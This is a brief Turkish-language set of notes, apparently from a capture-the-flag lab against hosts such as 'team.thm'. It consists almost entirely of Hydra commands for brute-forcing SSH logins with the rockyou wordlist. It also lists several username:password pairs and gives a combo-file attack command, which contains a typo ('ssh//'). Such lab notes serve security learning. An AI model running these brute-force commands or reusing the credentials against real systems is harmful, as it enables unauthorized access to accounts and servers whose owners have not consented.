*** ssh için dale ismi ile bruteforce ***

``` bash
hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://team.thm
```
veya

``` bash
hydra -l dale -P /usr/share/wordlists/rockyou.txt  ssh://10.10.10.10
```
claire-r:Password1

chris-r:letmein

jill-v:sunshinel

barry-b:sandwich

``` bash
hydra -C file ssh//10.10.1.1 -T4 
```
